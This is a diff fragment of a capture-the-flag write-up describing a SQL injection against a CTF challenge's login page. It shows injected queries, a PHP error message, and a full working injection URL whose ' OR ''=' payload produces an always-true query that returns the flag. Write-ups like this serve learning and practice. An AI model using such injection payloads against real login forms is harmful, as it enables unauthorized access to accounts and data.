@@ -43,3 +43,9 @@ SELECT * FROM users WHERE username = '' OR username LIKE '%' --' AND password = 
 Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, boolean given in /app/index.php on line 21
 ```
 So I now needed to figure out where this had gone wrong...
+
+> I couldn't spot what was wrong. So, for now, and after consultation with a friend who had previously solved this, I used the URL:  
+`http://ctf.hackucf.org:4001/?username=%27%20OR%20%27%27=%27&password=%27%20OR%20%27%27=%27&iamahacker=1&debug=1`  
+which makes the select statement:  
+`SELECT * FROM users WHERE username = '' OR ''='' AND password = '' OR ''=''`  
+and gave me the flag. However, I will return and fix my original solution when I work out the problem.
